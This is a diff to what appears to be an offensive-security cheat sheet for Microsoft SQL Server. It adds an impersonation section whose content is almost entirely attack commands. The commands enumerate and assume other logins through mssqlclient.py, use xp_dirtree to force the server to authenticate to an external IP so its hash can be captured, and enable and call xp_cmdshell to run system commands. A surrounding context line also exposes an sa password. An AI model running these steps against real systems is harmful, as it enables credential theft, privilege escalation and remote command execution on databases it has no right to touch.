@@ -164,6 +164,25 @@ sqlcmd -Q "use ADSync; select name from PK_mms_management_agent"
 Invoke-SQLAudit -Verbose
 ```
 
+#### Impersonation
+
+If you can impersonate another user, try to grab the user's hash. (mssqlclient.py)
+
+```bash
+enum_impersonate
+exec_as_login hrappdb-reader
+exec_as_user hrappdb-reader
+```
+
+If you can't enable_xp_cmdshell or execute commands, try switching databases.
+
+```bash
+xp_dirtree //192.168.45.204/test/share
+enable_xp_cmdshell
+xp_cmdshell whoami
+use hrappdb
+```
+
 If AD Azure, check out "https://blog.xpnsec.com/azuread-connect-for-redteam/".
 
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; exec xp_cmdshell 'whoami'"
